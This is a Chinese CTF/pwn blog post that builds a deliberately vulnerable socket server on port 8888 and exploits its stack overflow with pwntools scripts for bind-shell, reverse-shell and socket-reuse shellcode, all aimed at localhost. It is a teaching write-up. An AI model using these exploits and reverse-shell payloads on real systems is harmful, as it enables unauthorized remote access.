---
title: Getshell远程：真·RCE 正连？反连？不连？ 
date: 2020-12-13 00:00:03
categories:
- CTF/Pwn
tags: Getshell
---

> 真实的网络程序和Pwn题目中把输入输出映射到网络端口，二者程序本体的交互接口显然是不同的，后一种的CTF题目，真的具有现实意义么？如果是真的网络程序，我控制流劫持后直接执行system("/bin/sh")可以拿到shell么？如果不能，我如何才能Getshell呢？本篇我们通过一个例题回答上述问题。

## socket

> 一句话理解：socket是API，背后实现了TCP/IP协议栈

- [Socket API](https://www.jianshu.com/p/0daaa67dfa29)
- [一文让你透彻理解Linux的SOCKET编程（含实例解析）](https://zhuanlan.zhihu.com/p/180556309)
- [sockaddr和sockaddr_in详解](https://blog.csdn.net/qingzhuyuxian/article/details/79736821)
- [Socket为什么要翻译成套接字？](https://www.zhihu.com/question/21383903)
- [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/)
- [Beej's Guide to Network Programming 翻译](https://github.com/y11022053/Beej-s-Guide_Network_Programming_Chinese_Edition/blob/master/bgnet_cn_michael.txt)
- [Beej's Guide to Network Programming 正体中文版](https://beej-zhtw-gitbook.netdpi.net/)

## 例题

一个简单的栈溢出，不过输入接口是程序自身的启动的网络接口（tcp:8888）

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
  int  s,c,j  =  0xe4ff;
  char buf[10];
  
  struct sockaddr_in server; 
  server.sin_family      = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port        = htons(8888);

  s = socket(AF_INET,SOCK_STREAM,0);
      bind  (s,(struct sockaddr *)&server,sizeof(server));
      listen(s,10);
  c = accept(s,NULL,NULL);
      read  (c,buf,1000);

  return 0;
}
```

关闭所有保护编译：

```c
➜  gcc main.c -fno-stack-protector -z execstack -no-pie -o main
```

特意预留了0xe4ff这个变量，小端存储对应的机器码就是`jmp rsp`：

```python
>>> from pwn import *
>>> context(arch='amd64')
>>> disasm('\xff\xe4')
'   0:   ff e4          jmp    rsp'
```

找到编译后这个gadget的地址，即可写利用了：

```python
➜  ROPgadget --binary ./main | grep "jmp rsp"
0x0000000000400698 : jmp rsp
```

### 本地

在常见的CTF题目中我们

```python
from pwn import *
context(arch='amd64',os='linux')
io = remote("127.0.0.1",8888)
shellcode = asm(shellcraft.sh())
io.send('a'*40+p64(0x400698)+shellcode)
```

![image](https://xuanxuanblingbling.github.io/assets/pic/shell/1.png)

### 正连

```python
from pwn import *
context(arch='amd64',os='linux')

io = remote("127.0.0.1",8888)
sc = asm(shellcraft.bindsh(4444))
io.send('a'*40+p64(0x400698)+sc)

sh = remote("127.0.0.1",4444)
sh.interactive()
```

![image](https://xuanxuanblingbling.github.io/assets/pic/shell/2.png)

### 反连

- [Linux反弹shell（一）文件描述符与重定向](https://xz.aliyun.com/t/2548)
- [Linux反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)
- [Linux下几种常见的反弹shell方式](https://www.jianshu.com/p/9456473a0a14)


```python
from pwn import *
context(arch='amd64',os='linux')

sh = listen(4444)
io = remote("127.0.0.1",8888)
shellcode = asm(shellcraft.connect('127.0.0.1',4444)+shellcraft.dupsh())
io.send('a'*40+p64(0x400698)+shellcode)

sh.wait_for_connection()
sh.interactive()
```

![image](https://xuanxuanblingbling.github.io/assets/pic/shell/3.png)

### 不连

> 其实并不可能不连，你要远程攻击他，那必定得有数据通路，这里其实是连接复用。

- [远程漏洞利用：无需借助套接字的Shellcode](https://www.anquanke.com/post/id/85306)
- [X-NUCA 2020 Final 团队赛：QMIPS](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/11/xnuca/)

```python
from pwn import *
context(arch='amd64',os='linux')
io = remote("127.0.0.1",8888)
#shellcode = asm(shellcraft.dupsh(4))
shellcode = asm(shellcraft.findpeersh(io.lport))
io.send('a'*40+p64(0x400698)+shellcode)
io.interactive()
```

![image](https://xuanxuanblingbling.github.io/assets/pic/shell/4.png)

### 总结

```python
from pwn import *
context(arch='amd64',os='linux')
io = remote("127.0.0.1",8888)
#shellcode = asm(shellcraft.sh())
#shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
#shellcode = asm(shellcraft.connect('127.0.0.1',4444)+shellcraft.dupsh())
#shellcode = asm(shellcraft.dupsh(4))
#shellcode = asm(shellcraft.findpeersh(io.lport))
io.send('a'*40+p64(0x400698)+shellcode)
io.interactive()
```

## 回答

- 问：如果是真的网络程序，我控制流劫持后直接执行system("/bin/sh")可以拿到shell么？
- 答：不能在远程拿到shell。

- 问：以上情节，如何远程Getshell呢？
- 答：正连、反连、不连。

- 问：把标准输入输出映射到网络端口的CTF题目，真的具有现实意义么？
- 答：有，其实就是换个shellcode的事。

